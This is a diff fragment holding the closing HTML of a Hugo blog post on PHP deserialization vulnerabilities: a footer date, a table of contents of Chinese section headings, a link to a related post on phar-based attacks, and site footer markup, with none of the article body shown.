+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-11-09 23:30 &#43;0800</p>
+			</footer>
+		</article>
+		<aside id="toc" class="show-toc">
+			<div class="toc-title"></div>
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="#基础知识">基础知识</a></li>
+    <li><a href="#序列化格式">序列化格式</a></li>
+    <li><a href="#magic-methods">Magic methods</a>
+      <ul>
+        <li><a href="#php16个魔术方法">PHP16个魔术方法</a></li>
+      </ul>
+    </li>
+    <li><a href="#反序列化漏洞">反序列化漏洞</a>
+      <ul>
+        <li><a href="#eg1">e.g.1</a></li>
+        <li><a href="#eg2">e.g.2</a></li>
+      </ul>
+    </li>
+    <li><a href="#拓展">拓展</a>
+      <ul>
+        <li><a href="#字符串逃逸">字符串逃逸</a></li>
+        <li><a href="#函数使字符变少">函数使字符变少</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+		</aside>
+		<div class="post-nav thin">
+			<a class="next-post" href="https://theoyu.top/posts/phar/">
+				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;</span><br><span>利用 phar 拓展 php 反序列化漏洞攻击面</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2021 <a href="https://theoyu.top/">Theoyu</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://theoyu.top/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://theoyu.top/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
+	
+
+</body>
+
+</html>
